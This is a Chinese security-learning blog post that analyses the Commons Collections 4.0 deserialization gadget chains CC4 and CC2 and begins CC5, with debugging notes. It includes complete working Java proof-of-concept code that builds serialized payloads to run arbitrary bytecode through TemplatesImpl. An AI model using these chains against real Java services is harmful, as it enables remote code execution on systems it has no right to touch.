    <url>/2025/09/02/CC4_CC2_CC5_CC7/</url>
    
    <content type="html"><![CDATA[<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><ul><li><font style="color:rgb(80, 80, 92);">Commons-Collections 4.0</font></li></ul><p><a href="https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0">https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>JDK 8u65</li></ul><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>以 <font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform 为出发点，往回找</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852635.png"></p><p><font style="color:#080808;background-color:#ffffff;">找到 TransformingComparator.compare 中调用了 transform 方法</font></p><p><font style="color:#080808;background-color:#ffffff;">再找到 PriorityQueue 类中：</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852526.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852926.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853566.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853113.png"></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><p>最后找到的链也就是：</p><p><font style="color:#080808;background-color:#ffffff;">PriorityQueue.</font></p><p><font style="color:#080808;background-color:#ffffff;">readObject</font></p><p><font style="color:#080808;background-color:#ffffff;">heapify</font></p><p><font style="color:#080808;background-color:#ffffff;">siftDown</font></p><p><font style="color:#080808;background-color:#ffffff;">siftDownUsingComparator</font></p><p><font style="color:#080808;background-color:#ffffff;">compare</font></p><p><font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font><strong><font style="color:#080808;background-color:#ffffff;"></font></strong></p><p><font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font></p><p><font style="color:#080808;background-color:#ffffff;">PriorityQueue.readObject.heapify.siftDown.siftDownUsingComparator.compare</font></p><p>-&gt;</p><p><font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font></p><p>-&gt;</p><p><font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><h2 id="编写-POC："><a href="#编写-POC：" class="headerlink" title="编写 POC："></a><font style="color:#080808;background-color:#ffffff;">编写 POC：</font></h2><p>先将 CC3 的代码执行部分拿来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//代码执行 InstantiateTransformer</span><br><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>bytecodesFiled.set(templates, codes);<br><br><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>    instantiateTransformer<br>&#125;;<br><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">对照源码进行构造：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);<br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">写好之后，发现没有反应</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853126.png"></p><p>调试来到此处：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853395.png"></p><p>看到 size:0 ，不会进入 siftDown.</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853636.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853140.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853829.png"></p><blockquote><p><code>for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</code></p><h3 id="1-size-1"><a href="#1-size-1" class="headerlink" title="1. size &gt;&gt;&gt; 1"></a>1. <code>size &gt;&gt;&gt; 1</code></h3><ul><li><code>&gt;&gt;&gt;</code> 是 <strong>无符号右移运算符</strong>。</li><li><code>size &gt;&gt;&gt; 1</code> 等价于 <code>size / 2</code>（向下取整），但不同于 <code>/2</code> 的地方在于：<ul><li><code>/2</code> 是普通的除法运算；</li><li><code>&gt;&gt;&gt; 1</code> 是位运算，执行效率更高（尤其是在底层算法里）。</li></ul></li></ul><p>所以 <code>size &gt;&gt;&gt; 1</code> 就是 <strong>数组长度的一半</strong>。</p><h3 id="2-size-1-1"><a href="#2-size-1-1" class="headerlink" title="2. (size &gt;&gt;&gt; 1) - 1"></a>2. <code>(size &gt;&gt;&gt; 1) - 1</code></h3><ul><li>先取数组长度的一半，再减去 1。</li><li>结果是 <strong>从数组的最后一个非叶子节点开始的位置</strong>。</li></ul><p>例如在堆排序或优先队列的实现中：</p><ul><li>叶子节点的下标范围是 <code>size/2 ~ size-1</code>。</li><li>非叶子节点的最后一个位置就是 <code>(size/2)-1</code>。</li></ul><h3 id="3-for-int-i-i-0-i"><a href="#3-for-int-i-i-0-i" class="headerlink" title="3. for (int i = ...; i &gt;= 0; i--)"></a>3. <code>for (int i = ...; i &gt;= 0; i--)</code></h3><ul><li><code>i</code> 从 <code>(size &gt;&gt;&gt; 1) - 1</code> 开始，递减到 <code>0</code>。</li><li>也就是说：<strong>循环会从最后一个非叶子节点开始，往前遍历所有非叶子节点，直到根节点</strong>。</li></ul><p>这是一个建堆（heapify）的实现。作用是：<strong>从最后一个非叶子节点开始，依次向前调整，直到把整个数组调整成一个堆结构</strong>。  </p></blockquote><p>所以要保证 size 为 2 才能进入 for 循环执行代码</p><p>于是添加：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">priorityQueue.add(<span class="hljs-number">1</span>);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>此时执行代码后报错了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853681.png"></p><p>跟进 add 函数：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854556.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854839.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854687.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854246.png"></p><p>发现 add 函数也会调用 <font style="color:#080808;background-color:#ffffff;">compare，而当 add 调用 compare 也就会调用 </font>transform</p><p>而我们知道 _tfactory 在反序列化的时候才会被赋值【CC3 中分析 利用 TemplatesImpl 加载字节码 时提及】</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854728.png"></p><p>所以，先给  <font style="color:#080808;background-color:#ffffff;">transformers&#x2F;chainedTransformer 传一个没用的东西，让 add 执行时不会调用</font></p><p><font style="color:#080808;background-color:#ffffff;">compare.transform ,在反序列化时再赋给正常值。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-comment">//TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</span><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>这样就可以正常执行了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854475.png"></p><h3 id="完整的POC："><a href="#完整的POC：" class="headerlink" title="完整的POC："></a>完整的POC：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC4;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//代码执行 InstantiateTransformer</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-comment">//TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</span><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><h2 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h2><p>CC2 和 CC4 并无太大区别，CC2 的前半部分同样为：<font style="color:#080808;background-color:#ffffff;">PriorityQueue.readObject.heapify.siftDown.siftDownUsingComparator.compare</font></p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font></p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font></p><p><font style="color:#080808;background-color:#ffffff;">之后，CC4：</font></p><p><font style="color:rgb(44, 62, 80);">InstantiateTransformer.transform </font></p><p><font style="color:rgb(44, 62, 80);">-&gt; TrAXFilter.TrAXFilter</font></p><p><font style="color:#080808;background-color:#ffffff;">-&gt; TemplatesImpl.newTransforemer</font></p><p>-&gt; TransletClassLoader.newInstance</p><p>CC2:</p><p>InvokerTransformer.transform</p><p><font style="color:#080808;background-color:#ffffff;">-&gt; TemplatesImpl.newTransforemer</font></p><p>-&gt; TransletClassLoader.newInstance</p><h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC2;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//代码执行 </span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        <span class="hljs-comment">//改为 templates</span><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//改为 invokerTransformer</span><br>        transformerField.set(transformingComparator, invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854831.png"></p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><h2 id="分析：-2"><a href="#分析：-2" class="headerlink" title="分析："></a>分析：</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854635.png"></p><p>CC5 的起点变成了 BadAttributeValueExpException,调用的是 TiedMapEntry.toString ，之后便是 LazyMap.get（CC1-LazyMap&#x2F;CC6）。</p><p>这里从正向走比较方便，如果从 LazyMap.get 出发，会用很多调用 get 方法的类，不好找。</p><p>来到 BadAttributeValueExpException 类，跟进 toString() 方法</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854357.png"></p><p>这里的 toString() 方法要找到调用它的类，然后就找到了 TiedMapEntry 类中调用的 toString</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854464.png"></p><p>getValue 调用了 map.get，后续便是 LazyMap 调用 get。</p><p><img 